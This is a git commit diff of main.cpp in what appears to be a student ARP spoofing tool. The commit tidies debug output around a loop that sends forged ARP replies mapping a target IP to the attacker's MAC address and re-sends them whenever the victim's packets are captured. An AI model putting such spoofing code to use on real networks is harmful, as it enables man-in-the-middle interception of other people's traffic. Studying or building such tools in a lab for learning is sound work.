705d633123d4c0dbd02c28a139d55c0a1f6739e6
myeong <myeong@myeongjin.myeongjin>
2024-05-01 19:25:30 +0900

    ....

--- main.cpp
+++ main.cpp
@@ -147,11 +147,10 @@ int main(int argc, char* argv[]) {
 
 		// trick Sender [ target ip -> attacker ip ]
 		send_arp_packet(handle, &packet, (char *)sender.c_str(), attacker_mac, target_ip, (char *)sender.c_str(), sender_ip, 1);
-		printf("sender tricked");
+		printf("sender tricked\n");
 
 		// Arp spoof
 		while (true) {
-			printf("1");
 			int option = 0;
 			
 			// Trick periodically
@@ -172,14 +171,7 @@ int main(int argc, char* argv[]) {
 			//gateway = 192.168.254.74
 			EthArpPacket* receive_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet_data));
 
-			//printf("\n\narp_sip = %d | %d\n\n", htons(receive_packet->eth_.type_), htons(EthHdr::Arp));
-			// printf("\n\nsip = %s\n\n", std::string(receive_packet->arp_.sip_).c_str());
-			// printf("\n\ntip = %s\n\n", std::string(receive_packet->arp_.tip_).c_str());
-			// printf("\n\nIP = %s\n\n", std::string(Ip(htons(Ip(sender_ip)) | (htons(Ip(sender_ip) >> 16) << 16))).c_str());
-			// printf("\n\nIP = %s\n\n", std::string(Ip(htons(Ip(target_ip)) | (htons(Ip(target_ip) >> 16) << 16))).c_str());
-
-
-			if (receive_packet->arp_.sip_ == Ip(htons(Ip(sender_ip)) | (htons(Ip(sender_ip) >> 16) << 16))){//&& htons(receive_packet->eth_.type_) == htons(EthHdr::Arp)) {
+			if (receive_packet->arp_.sip_ == Ip(htons(Ip(sender_ip)) | (htons(Ip(sender_ip) >> 16) << 16))) {
 				// Trick periodically
 				send_arp_packet(handle, &packet, (char *)sender.c_str(), attacker_mac, target_ip, (char *)sender.c_str(), sender_ip, 1);
 				printf("capture - sender packet!!\n");
